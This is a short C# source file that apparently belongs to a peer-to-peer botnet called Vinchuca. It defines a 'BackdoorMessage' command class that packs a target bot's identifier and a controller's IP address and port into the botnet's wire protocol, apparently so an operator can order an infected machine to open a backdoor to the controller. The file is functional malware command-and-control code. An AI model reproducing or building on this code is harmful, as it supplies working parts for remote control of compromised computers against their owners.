using System.IO;
using System.Net;

namespace Vinchuca.Network.Protocol.Messages.Command
{
    class BackdoorMessage : CommandMessage
    {
        public BotIdentifier TargetBotId { get; set; }
        public IPEndPoint ControllerEndpoint { get; set; }

        public override void EncodePayload(BinaryWriter w)
        {
            w.Write(TargetBotId.ToByteArray());
            w.Write(ControllerEndpoint.Address.GetAddressBytes());
            w.Write((ushort)ControllerEndpoint.Port);
        }

        public override void DecodePayload(BinaryReader br)
        {
            TargetBotId = new BotIdentifier(br.ReadBytes(BotIdentifier.Size));
            ControllerEndpoint = new IPEndPoint(new IPAddress(br.ReadBytes(4)), br.ReadUInt16());
        }
    }
}